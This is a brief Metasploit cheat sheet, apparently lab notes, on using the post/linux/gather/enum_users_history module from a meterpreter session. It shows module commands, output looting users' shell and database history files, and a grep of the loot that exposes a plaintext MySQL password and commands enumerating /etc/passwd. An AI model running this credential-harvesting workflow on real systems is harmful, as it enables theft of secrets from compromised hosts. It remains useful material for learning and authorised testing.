# Metasploit

## Post Module

```
msf > use post/linux/gather/enum_users_history

msf post(linux/gather/enum_users_history) > options

Module options (post/linux/gather/enum_users_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(linux/gather/enum_users_history) > set session <session_ID>

msf post(linux/gather/enum_users_history) > run
```

## Usage

```
meterpreter > run post/linux/gather/enum_users_history

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[-] Failed to open file: /home/user/.ash_history: core_channel_open: Operation failed: 1
[+] bash history for user stored in /root/.msf4/loot/20220523132458_default_10.10.198.41_linux.enum.users_602188.txt
[-] Failed to open file: /home/user/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/sudoers: core_channel_open: Operation failed: 1
[+] Last logs stored in /root/.msf4/loot/20220523132500_default_10.10.198.41_linux.enum.users_618604.txt

$ sudo cat /root/.msf4/loot/20220523132458_default_10.10.198.41_linux.enum.users_602188.txt | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
```